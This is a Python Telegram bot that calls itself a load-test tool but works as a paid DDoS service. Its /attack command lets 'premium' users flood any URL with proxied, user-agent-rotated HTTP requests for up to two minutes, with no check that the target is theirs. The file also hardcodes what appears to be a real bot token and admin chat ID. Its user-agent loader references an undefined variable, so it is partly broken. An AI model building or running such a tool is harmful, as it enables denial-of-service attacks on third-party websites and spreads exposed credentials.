import telebot
import os
import threading
import time
import requests
import random

# Initialize bot with your token
bot = telebot.TeleBot("7271742802:AAFDNZEHUnARvj7ilHHlXGxApASiI5x8RbQ")

# Admin details
ADMIN_USER = "Mysterious_50"
ADMIN_CHAT_ID = 7593930576
# File paths
PREMIUM_USERS_FILE = "premium_users.txt"
PROXY_FILE = "proxy.txt"
UA_FILES = ["a.txt", "d.txt", "s.txt"]
# Global variables
is_attack_running = False

# Load premium users
def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, 'r') as f:
        return set(line.strip() for line in f if line.strip())

# Save premium users
def save_premium_users(users):
    with open(PREMIUM_USERS_FILE, 'w') as f:
        f.write("\n".join(users))

# Load proxies
def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# Load user-agents
def load_user_agents():
    if os.path.exists(UA_FILE):
        with open(UA_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# Load premium users at startup
premium_users = load_premium_users()

# Start command
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, """
> Welcome to Load Test Bot!
Commands:

/attack <url> <time> - Start a load test
/methods - Show attack methods
/proxycount - Show proxy count
/uacount - Show user-agent count
/addprem <username> - Add premium user (Admin only)
/delprem <username> - Remove premium user (Admin only)
    """)

# Methods command
@bot.message_handler(commands=['methods'])
def methods_command(message):
    bot.send_message(message.chat.id, "Available Methods: SIMPLE, ADVANCED")

# Attack command
@bot.message_handler(commands=['attack'])
def attack_command(message):
    global is_attack_running

    username = message.from_user.username
    chat_id = message.chat.id

    if username not in premium_users:
        bot.send_message(chat_id, "Access Denied! Only premium users can start an attack.")
        return

    if is_attack_running:
        bot.send_message(chat_id, "An attack is already running. Wait until it finishes.")
        return

    args = message.text.split(' ')
    if len(args) != 3:
        bot.send_message(chat_id, "Usage: /attack <url> <time>")
        return

    url = args[1]
    duration = int(args[2])

    if duration > 120:
        bot.send_message(chat_id, "Maximum attack duration is 120 seconds.")
        return

    is_attack_running = True
    bot.send_message(chat_id, f"Starting load test on {url} for {duration} seconds.")

    def run_attack():
        global is_attack_running
        proxies = load_proxies()
        user_agents = load_user_agents()
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                headers = {'User-Agent': random.choice(user_agents)} if user_agents else {}
                proxy = {"http": random.choice(proxies)} if proxies else None
                requests.get(url, headers=headers, proxies=proxy, timeout=5)
            except:
                pass

        is_attack_running = False
        bot.send_message(chat_id, f"Load test completed for {url}.")

    threading.Thread(target=run_attack).start()

# Proxy count command
@bot.message_handler(commands=['proxycount'])
def proxy_count_command(message):
    count = len(load_proxies())
    bot.send_message(message.chat.id, f"Proxy Count: {count}")

# User-agent count command
@bot.message_handler(commands=['uacount'])
def ua_count_command(message):
    count = len(load_user_agents())
    bot.send_message(message.chat.id, f"User-Agent Count: {count}")

# Add premium user command
@bot.message_handler(commands=['addprem'])
def add_premium_user_command(message):
    username = message.from_user.username
    if username == ADMIN_USER:
        args = message.text.split(' ')
        if len(args) != 2:
            bot.send_message(message.chat.id, "Usage: /addprem <username>")
            return
        user_to_add = args[1]
        premium_users.add(user_to_add)
        save_premium_users(premium_users)
        bot.send_message(message.chat.id, f"User {user_to_add} added to premium users.")
    else:
        bot.send_message(message.chat.id, "Access Denied! Admin only.")

# Remove premium user command
@bot.message_handler(commands=['delprem'])
def del_premium_user_command(message):
    username = message.from_user.username
    if username == ADMIN_USER:
        args = message.text.split(' ')
        if len(args) != 2:
            bot.send_message(message.chat.id, "Usage: /delprem <username>")
            return
        user_to_remove = args[1]
        if user_to_remove in premium_users:
            premium_users.remove(user_to_remove)
            save_premium_users(premium_users)
            bot.send_message(message.chat.id, f"User {user_to_remove} removed from premium users.")
        else:
            bot.send_message(message.chat.id, f"User {user_to_remove} is not a premium user.")
    else:
        bot.send_message(message.chat.id, "Access Denied! Admin only.")

# Start bot
bot.polling()
